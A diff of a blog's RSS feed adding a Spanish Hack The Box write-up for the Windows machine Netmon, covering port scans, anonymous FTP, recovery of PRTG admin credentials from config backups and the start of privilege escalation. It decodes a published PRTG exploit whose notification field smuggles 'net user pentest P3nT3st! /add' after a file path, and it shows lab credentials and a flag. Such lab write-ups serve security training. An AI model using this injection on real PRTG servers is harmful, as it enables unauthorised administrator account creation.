@@ -5,13 +5,466 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 14 Jun 2023 00:09:33 +0000</pubDate>
-    <lastBuildDate>Wed, 14 Jun 2023 00:09:33 +0000</lastBuildDate>
+    <pubDate>Wed, 14 Jun 2023 06:39:26 +0000</pubDate>
+    <lastBuildDate>Wed, 14 Jun 2023 06:39:26 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
     
       <item>
+        <title>Maquina Netmon - htb writeup</title>
+        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Netmon&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt; dificultad facil, la cual explotaremos a partir de una enumeración por &lt;code&gt;ftp&lt;/code&gt; donde obtendremos archivos de configuración con credenciales que nos permitiran conectarnos al servicio web y despues nos aprovecharemos de una vulnerabilidad de &lt;code&gt;PRTG&lt;/code&gt; que nos permitira realizar la creación de un usuario a nivel de sistema y le añadiremos permisis de administrador, para finalmente conectarnos al sistema como el usuario &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Netmon
+❯ ls
+ Netmon
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.152
+PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
+64 bytes from 10.10.10.152: icmp_seq=1 ttl=127 time=200 ms
+
+--- 10.10.10.152 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 199.775/199.775/199.775/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt;correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 04:18 GMT
+Initiating SYN Stealth Scan at 04:18
+Scanning 10.10.10.152 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.152
+Discovered open port 21/tcp on 10.10.10.152
+Discovered open port 135/tcp on 10.10.10.152
+Discovered open port 139/tcp on 10.10.10.152
+Discovered open port 445/tcp on 10.10.10.152
+Discovered open port 49667/tcp on 10.10.10.152
+Discovered open port 49664/tcp on 10.10.10.152
+Discovered open port 49668/tcp on 10.10.10.152
+Discovered open port 47001/tcp on 10.10.10.152
+Discovered open port 49666/tcp on 10.10.10.152
+Discovered open port 49669/tcp on 10.10.10.152
+Discovered open port 5985/tcp on 10.10.10.152
+Discovered open port 49665/tcp on 10.10.10.152
+Completed SYN Stealth Scan at 04:18, 23.62s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.152
+Host is up, received user-set (0.14s latency).
+Scanned at 2023-06-14 04:18:22 GMT for 24s
+Not shown: 63185 closed tcp ports (reset), 2337 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE      REASON
+21/tcp    open  ftp          syn-ack ttl 127
+80/tcp    open  http         syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+47001/tcp open  winrm        syn-ack ttl 127
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+49669/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 23.76 seconds
+           Raw packets sent: 116389 (5.121MB) | Rcvd: 77893 (3.116MB)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 04:19 GMT
+Nmap scan report for 10.10.10.152
+Host is up (0.40s latency).
+
+PORT      STATE SERVICE      VERSION
+21/tcp    open  ftp          Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-03-19  12:18AM                 1024 .rnd
+| 02-25-19  10:15PM       &amp;lt;DIR&amp;gt;          inetpub
+| 07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
+| 02-25-19  10:56PM       &amp;lt;DIR&amp;gt;          Program Files
+| 02-03-19  12:28AM       &amp;lt;DIR&amp;gt;          Program Files (x86)
+| 02-03-19  08:08AM       &amp;lt;DIR&amp;gt;          Users
+|_02-25-19  11:49PM       &amp;lt;DIR&amp;gt;          Windows
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+|_http-server-header: PRTG/18.1.37.13946
+| http-title: Welcome | PRTG Network Monitor (NETMON)
+|_Requested resource was /index.htm
+|_http-trane-info: Problem with XML parsing of /evox/about
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2023-06-14T04:20:28
+|_  start_date: 2023-06-14T04:14:56
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 77.25 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;21&lt;/td&gt;
+      &lt;td&gt;FTP&lt;/td&gt;
+      &lt;td&gt;Microsoft ftpd&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;80&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;Indy httpd 18.1.37.13946&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;135&lt;/td&gt;
+      &lt;td&gt;RPC&lt;/td&gt;
+      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;139&lt;/td&gt;
+      &lt;td&gt;LDAP&lt;/td&gt;
+      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;445&lt;/td&gt;
+      &lt;td&gt;SMP&lt;/td&gt;
+      &lt;td&gt;Microsoft Windows Server 2008 R2 - 2012 microsoft-ds&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;5985&lt;/td&gt;
+      &lt;td&gt;WINRM&lt;/td&gt;
+      &lt;td&gt;Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;47001&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;Microsoft HTTPAPI httpd 2.0&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;49664-49669&lt;/td&gt;
+      &lt;td&gt;MSRPC&lt;/td&gt;
+      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzaremos enumerando el servicio &lt;code&gt;ftp&lt;/code&gt; haciendo uno del usuario &lt;code&gt;anonymous&lt;/code&gt;, sin proporcionar contraseña.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.152
+Connected to 10.10.10.152.
+220 Microsoft FTP Service
+Name (10.10.10.152:fmiracle): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&amp;gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-03-19  12:18AM                 1024 .rnd
+02-25-19  10:15PM       &amp;lt;DIR&amp;gt;          inetpub
+07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
+02-25-19  10:56PM       &amp;lt;DIR&amp;gt;          Program Files
+02-03-19  12:28AM       &amp;lt;DIR&amp;gt;          Program Files (x86)
+02-03-19  08:08AM       &amp;lt;DIR&amp;gt;          Users
+02-25-19  11:49PM       &amp;lt;DIR&amp;gt;          Windows
+226 Transfer complete.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si nos dirigimos al directorio &lt;code&gt;Users&lt;/code&gt;, vemos que podemos obtener la primera flag &lt;code&gt;user.txt&lt;/code&gt;, pero aun no tenemos acceso al sistema.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; cd Users
+250 CWD command successful.
+ftp&amp;gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-25-19  11:44PM       &amp;lt;DIR&amp;gt;          Administrator
+02-03-19  12:35AM       &amp;lt;DIR&amp;gt;          Public
+226 Transfer complete.
+ftp&amp;gt; cd Public
+250 CWD command successful.
+ftp&amp;gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Documents
+07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Downloads
+07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Music
+07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Pictures
+06-14-23  12:15AM                   34 user.txt
+07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Videos
+226 Transfer complete.
+ftp&amp;gt; get user.txt
+local: user.txt remote: user.txt
+200 PORT command successful.
+150 Opening ASCII mode data connection.
+226 Transfer complete.
+34 bytes received in 0.20 secs (0.1620 kB/s)
+ftp&amp;gt; exit
+221 Goodbye.
+❯ cat user.txt
+❯ c07be14afc2253b24510769dcb7db65
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Para poder enumear de una manera mas comoda los archivos mediante &lt;code&gt;ftp&lt;/code&gt;, vamos a crearnos una montura con la herramienta &lt;code&gt;curlftpfs&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curlftpfs
+❯ mkdir /mnt/monturaftp
+❯ curlftpfs ftp://10.10.10.152 /mnt/monturaftp
+❯ ls -l /mnt/monturaftp
+d--------- root root   0 B  Sun Nov 20 22:46:00 2016  $RECYCLE.BIN
+d--------- root root   0 B  Sun Feb  3 08:05:00 2019  Documents and Settings
+d--------- root root   0 B  Mon Feb 25 22:15:00 2019  inetpub
+d--------- root root   0 B  Sat Jul 16 09:18:00 2016  PerfLogs
+d--------- root root   0 B  Mon Feb 25 22:56:00 2019  Program Files
+d--------- root root   0 B  Sun Feb  3 00:28:00 2019  Program Files (x86)
+d--------- root root   0 B  Wed Dec 15 10:40:00 2021  ProgramData
+d--------- root root   0 B  Sun Feb  3 08:05:00 2019  Recovery
+d--------- root root   0 B  Sun Feb  3 08:04:00 2019  System Volume Information
+d--------- root root   0 B  Sun Feb  3 08:08:00 2019  Users
+d--------- root root   0 B  Mon Feb 25 23:49:00 2019  Windows
+.--------- root root 380 KB Sun Nov 20 21:59:00 2016  bootmgr
+.--------- root root   1 B  Sat Jul 16 09:10:00 2016  BOOTNXT
+.--------- root root 704 MB Wed Jun 14 00:14:00 2023  pagefile.sys
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Antes de segui enumerando vamos a ver el servicio web, que esta expuesto en el puerto 80.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que el servicio corresponde a &lt;code&gt;PRTG Network Monitor&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;PRTG Network Monitor: PRTG (Paessler Router Traffic Grapher hasta la versión 7) es un software de monitoreo de red sin agentes de Paessler AG. El término general Paessler PRTG aúna varias versiones de software capaces de monitorizar y clasificar diferentes condiciones del sistema, como el uso del ancho de banda o el  tiempo de actividad, y recopilar estadísticas de diversos anfitriones como switches, routers, servidores y otros dispositivos y aplicaciones.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Buscamos si hay &lt;code&gt;exploits&lt;/code&gt; asociados a este servicio y entre ellos una de ejecución remota de comandos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit PRTG
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                                                 | windows/webapps/46527.sh
+PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                                                                                | windows/webapps/49156.txt
+PRTG Network Monitor &amp;lt; 18.1.39.1648 - Stack Overflow (Denial of Service)                                                                             | windows_x86/dos/44500.py
+PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                                                              | java/webapps/34108.txt
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;El exploit nos pide estar autenticados, asi que vamos a examinar la montura que previamente creamos y trataremos de buscar archivos de configuración, ya que estos suelen almacenar credenciales.&lt;/p&gt;
+
+&lt;p&gt;Encontramos archivos de configuración, y usaremos &lt;code&gt;diff&lt;/code&gt; para encontrar diferncias entre el archivo &lt;code&gt;.dat&lt;/code&gt; y el archivo &lt;code&gt;old.bak&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;diff &quot;PRTG Configuration.dat&quot; &quot;PRTG Configuration.old.bak&quot; | less
+&amp;lt;               &amp;lt;flags&amp;gt;
+&amp;lt;                 &amp;lt;encrypted/&amp;gt;
+&amp;lt;               &amp;lt;/flags&amp;gt;
+---
+&amp;gt;             &amp;lt;!-- User: prtgadmin --&amp;gt;
+&amp;gt;             PrTg@dmin2018
+317c313
+&amp;lt;                 77RULO2GA4Q3RVEUZ77IMPLVKABRRS2UNR3Q====
+---
+&amp;gt;                 6SLJOGVBYWJF5ZMURQWHEPJ3C3WT2NQDJOZA====
+325c321
+&amp;lt;                 IVK3MVDI6HCMYIRYQN264YLIRXNJWMB6NT3Q====
+---
+&amp;gt;                 ILD5YN3TROUJXG6ECLVDRKIPKTBKE274FTNQ====
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Obtenemos las credenciales &lt;code&gt;prtgadmin:PrTg@dmin2018&lt;/code&gt; con las cuales podamos logearnos en el servicio &lt;code&gt;PRTG&lt;/code&gt;, pero al intentar logearnos nos dicen que las credenciales son invalidas.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos tratar de hacer guesing y debido a que la contraseña termina en 2018, podemos modificarla por 2019.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Logramos conectarnos al panel como el usuario &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Si revisamos el exploit que tenemos, vemos que este realiza una petición a la ruta &lt;code&gt;myaccount.htm?tabid=2&lt;/code&gt; y envia una data que se encuentra &lt;code&gt;urlencodeada&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Usaremos una sesión interactiva de &lt;code&gt;php&lt;/code&gt; para urldecodear la data y ver mejor que es lo que envia.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;❯ php --interactive
+Interactive mode enabled
+php &amp;gt; echo urldecode(&quot;name_=create_user&amp;amp;tags_=&amp;amp;active_=1&amp;amp;schedule_=-1%7CNone%7C&amp;amp;postpone_=1&amp;amp;comments=&amp;amp;summode_=2&amp;amp;summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&amp;amp;summinutes_=1&amp;amp;accessrights_=1&amp;amp;accessrights_=1&amp;amp;accessrights_201=0&amp;amp;active_1=0&amp;amp;addressuserid_1=-1&amp;amp;addressgroupid_1=-1&amp;amp;address_1=&amp;amp;subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;contenttype_1=text%2Fhtml&amp;amp;customtext_1=&amp;amp;priority_1=0&amp;amp;active_17=0&amp;amp;addressuserid_17=-1&amp;amp;addressgroupid_17=-1&amp;amp;message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_8=0&amp;amp;addressuserid_8=-1&amp;amp;addressgroupid_8=-1&amp;amp;address_8=&amp;amp;message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_2=0&amp;amp;eventlogfile_2=application&amp;amp;sender_2=PRTG+Network+Monitor&amp;amp;eventtype_2=error&amp;amp;message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_13=0&amp;amp;sysloghost_13=&amp;amp;syslogport_13=514&amp;amp;syslogfacility_13=1&amp;amp;syslogencoding_13=1&amp;amp;message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_14=0&amp;amp;snmphost_14=&amp;amp;snmpport_14=162&amp;amp;snmpcommunity_14=&amp;amp;snmptrapspec_14=0&amp;amp;messageid_14=0&amp;amp;message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;senderip_14=&amp;amp;active_9=0&amp;amp;url_9=&amp;amp;urlsniselect_9=0&amp;amp;urlsniname_9=&amp;amp;postdata_9=&amp;amp;active_10=0&amp;amp;active_10=10&amp;amp;address_10=Demo+EXE+Notification+-+OutFile.ps1&amp;amp;message_10=%22C%3A%5CUsers%5CPublic%5Ctester.txt%3Bnet+user+pentest+P3nT3st!+%2Fadd%22&amp;amp;windowslogindomain_10=&amp;amp;windowsloginusername_10=&amp;amp;windowsloginpassword_10=&amp;amp;timeout_10=60&amp;amp;active_15=0&amp;amp;accesskeyid_15=&amp;amp;secretaccesskeyid_15=&amp;amp;arn_15=&amp;amp;subject_15=&amp;amp;message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_16=0&amp;amp;isusergroup_16=1&amp;amp;addressgroupid_16=200%7CPRTG+Administrators&amp;amp;ticketuserid_16=100%7CPRTG+System+Administrator&amp;amp;subject_16=%25device+%25name+%25status+%25down+(%25message)&amp;amp;message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&amp;amp;autoclose_16=1&amp;amp;objecttype=notification&amp;amp;id=new&amp;amp;targeturl=%2Fmyaccount.htm%3Ftabid%3D2&quot;);
+
+name_=create_user&amp;amp;tags_=&amp;amp;active_=1&amp;amp;schedule_=-1|None|&amp;amp;postpone_=1&amp;amp;comments=&amp;amp;summode_=2&amp;amp;summarysubject_=[%sitename] %summarycount Summarized Notifications&amp;amp;summinutes_=1&amp;amp;accessrights_=1&amp;amp;accessrights_=1&amp;amp;accessrights_201=0&amp;amp;active_1=0&amp;amp;addressuserid_1=-1&amp;amp;addressgroupid_1=-1&amp;amp;address_1=&amp;amp;subject_1=[%sitename] %device %name %status %down (%message)&amp;amp;contenttype_1=text/html&amp;amp;customtext_1=&amp;amp;priority_1=0&amp;amp;active_17=0&amp;amp;addressuserid_17=-1&amp;amp;addressgroupid_17=-1&amp;amp;message_17=[%sitename] %device %name %status %down (%message)&amp;amp;active_8=0&amp;amp;addressuserid_8=-1&amp;amp;addressgroupid_8=-1&amp;amp;address_8=&amp;amp;message_8=[%sitename] %device %name %status %down (%message)&amp;amp;active_2=0&amp;amp;eventlogfile_2=application&amp;amp;sender_2=PRTG Network Monitor&amp;amp;eventtype_2=error&amp;amp;message_2=[%sitename] %device %name %status %down (%message)&amp;amp;active_13=0&amp;amp;sysloghost_13=&amp;amp;syslogport_13=514&amp;amp;syslogfacility_13=1&amp;amp;syslogencoding_13=1&amp;amp;message_13=[%sitename] %device %name %status %down (%message)&amp;amp;active_14=0&amp;amp;snmphost_14=&amp;amp;snmpport_14=162&amp;amp;snmpcommunity_14=&amp;amp;snmptrapspec_14=0&amp;amp;messageid_14=0&amp;amp;message_14=[%sitename] %device %name %status %down (%message)&amp;amp;senderip_14=&amp;amp;active_9=0&amp;amp;url_9=&amp;amp;urlsniselect_9=0&amp;amp;urlsniname_9=&amp;amp;postdata_9=&amp;amp;active_10=0&amp;amp;active_10=10&amp;amp;address_10=Demo EXE Notification - OutFile.ps1&amp;amp;message_10=&quot;C:\Users\Public\tester.txt;net user pentest P3nT3st! /add&quot;&amp;amp;windowslogindomain_10=&amp;amp;windowsloginusername_10=&amp;amp;windowsloginpassword_10=&amp;amp;timeout_10=60&amp;amp;active_15=0&amp;amp;accesskeyid_15=&amp;amp;secretaccesskeyid_15=&amp;amp;arn_15=&amp;amp;subject_15=&amp;amp;message_15=[%sitename] %device %name %status %down (%message)&amp;amp;active_16=0&amp;amp;isusergroup_16=1&amp;amp;addressgroupid_16=200|PRTG Administrators&amp;amp;ticketuserid_16=100|PRTG System Administrator&amp;amp;subject_16=%device %name %status %down (%message)&amp;amp;message_16=Sensor: %name
+Status: %status %down
+
+&amp;amp;autoclose_16=1&amp;amp;objecttype=notification&amp;amp;id=new&amp;amp;targeturl=/myaccount.htm?tabid=2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que la data se enviar a un parametro &lt;code&gt;message_10&lt;/code&gt;, en donde crea un usuario de nombre &lt;code&gt;pentest&lt;/code&gt; a nivel de sistema &lt;code&gt;net user pentest P3nT3st! /add&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Podemos aprovecharnos de este y ejecutar una instrucción similar a la del exploit, donde crearemos un usuario al cual pondre de nombre &lt;code&gt;pentest&lt;/code&gt; y ademas lo añadire al grupo de Administradores.&lt;/p&gt;
+
+&lt;p&gt;Nos dirigimos a la ruta a donde manda la petición, damos en &lt;code&gt;Add new Notification&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Creamos un nombre de Notificación, en este caso &lt;code&gt;Nuevo&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;y ahora activamos la función &lt;code&gt;Execute Program&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
